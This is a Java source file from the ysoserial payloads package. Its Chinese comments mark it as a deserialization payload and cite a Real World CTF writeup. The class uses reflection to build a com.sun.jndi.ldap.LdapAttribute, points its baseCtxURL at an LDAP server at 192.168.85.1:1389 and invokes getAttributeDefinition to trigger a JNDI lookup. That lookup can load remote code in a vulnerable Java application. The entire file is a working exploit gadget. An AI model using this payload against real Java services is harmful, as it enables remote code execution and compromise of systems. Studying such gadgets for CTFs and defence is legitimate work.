package ysoserial.payloads;


import javax.naming.CompositeName;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;


// 适用于1.8、1.4
// 参考：[Real Wolrd CTF 3rd Writeup | Old System](https://mp.weixin.qq.com/s/ClASwg6SH0uij_-IX-GahQ)
public class LdapAttributePayload {

    public static void main(String[] args) throws Exception {

        // 构造反序列化payload
        String ldapCtxUrl = "ldap://192.168.85.1:1389/";

        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
            new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
            new Object[] {"name"});

        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
        baseCtxUrlField.setAccessible(true);
        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);

        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
        rdnField.setAccessible(true);
        rdnField.set(ldapAttribute, new CompositeName("i5jsbu"));


        // 触发
        Method getAttributeDefinitionMethod = ldapAttributeClazz.getMethod("getAttributeDefinition", new Class[] {});
        getAttributeDefinitionMethod.setAccessible(true);
        getAttributeDefinitionMethod.invoke(ldapAttribute, new Object[] {});

    }

}
